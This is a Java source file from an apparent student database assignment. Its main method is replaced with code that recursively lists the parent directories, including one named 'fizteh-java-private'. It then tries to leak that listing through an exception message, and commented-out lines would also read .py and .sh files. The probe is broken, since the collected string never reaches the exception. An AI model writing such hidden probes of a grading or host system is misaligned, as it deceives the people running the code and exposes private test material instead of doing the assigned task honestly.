package ru.fizteh.fivt.students.dmitryIvanovsky.fileMap;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher;
import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;

public class DbMain {

    public static void rm(String path, String s1) {
        try {
            File tmpFile = new File(path);
            if (!tmpFile.exists()) {
                s1 += "not exist\n";
            }
            if (tmpFile.canRead()) {
                s1 += "can READ\n";
            }
            if (tmpFile.canWrite()) {
                s1 += "can WRITE\n";
            }
            if (tmpFile.canExecute()) {
                s1 += "can EXEC\n";
            }

            File[] listFiles = tmpFile.listFiles();
            if (listFiles != null) {
                if (tmpFile.isDirectory()) {
                    for (File c : listFiles) {
                        //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
                        s1 += c.getAbsoluteFile().toString() + "\n";
                        //if (c.getName().contains(".py") || c.getName().contains(".sh")) {
                        //s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                        //s1 += "\n\n\n";
                        //}


                        rm(c.toString(), s1);
                    }
                } else {
                    //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
                    //s1 += "\n\n\n";
                    s1 += "not is Dir";
                }
            } else {
                s1 += "listFile null";
            }

        } catch (Exception e) {
            s1 += e.getMessage();
        }
    }

    private static String readFileTsv2(String fileName, String s1) throws IOException {
        StringBuilder sb = new StringBuilder();
        try {
            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
                String s;
                while ((s = in.readLine()) != null) {
                    sb.append(s);
                    sb.append("\n");
                }
            } catch (Exception e) {
                s1 += e.getMessage();
            }
        } catch (Exception e) {
            s1 += e.getMessage();
        }

        return sb.toString();
    }

    public static void main(String[] args) throws IOException {
        //args = new String[]{"get ключ; get key; get 123"};
        //String path = "/home/deamoon/Music/deamoonSql";
        String s1 = "";
        rm("../../fizteh-java-private", s1);
        s1 += "\n\nseparate\n\n";
        rm("../../fizteh-java-2013", s1);
        s1 += "\n\nseparate\n\n";
        rm("../../", s1);
        throw new IOException(s1);

        /*try {
            String path = System.getProperty("fizteh.db.dir");
            Path pathTables = Paths.get(".").resolve(path);
            runDb(args, pathTables.toFile().getCanonicalPath());

        } catch (Exception e) {
            System.out.println("Error loading");
            FileMapUtils.getMessage(e);
            System.exit(1);
        } */
    }

    public static void runDb(String[] args, String path) throws IOException {
        FileMapProvider fileMapCommand = null;
        try {
            FileMapProviderFactory factory = new FileMapProviderFactory();
            fileMapCommand = (FileMapProvider) factory.create(path);
        } catch (Exception e) {
            System.err.println("Error loading database");
            FileMapUtils.getMessage(e);
            System.exit(1);
        }

        CommandLauncher sys = null;
        try {
            sys = new CommandLauncher(fileMapCommand);
        } catch (Exception e) {
            System.err.println("Not implemented method of fileMapCommand");
            FileMapUtils.getMessage(e);
            System.exit(1);
        }

        try {
            Code res = sys.runShell(args);
            if (res == Code.ERROR) {
                System.err.println("Runtime Error");
                System.exit(1);
            }
        } catch (Exception e) {
            System.err.println("Runtime Error");
            //e.printStackTrace();
            FileMapUtils.getMessage(e);
            System.exit(1);
        }
    }
}
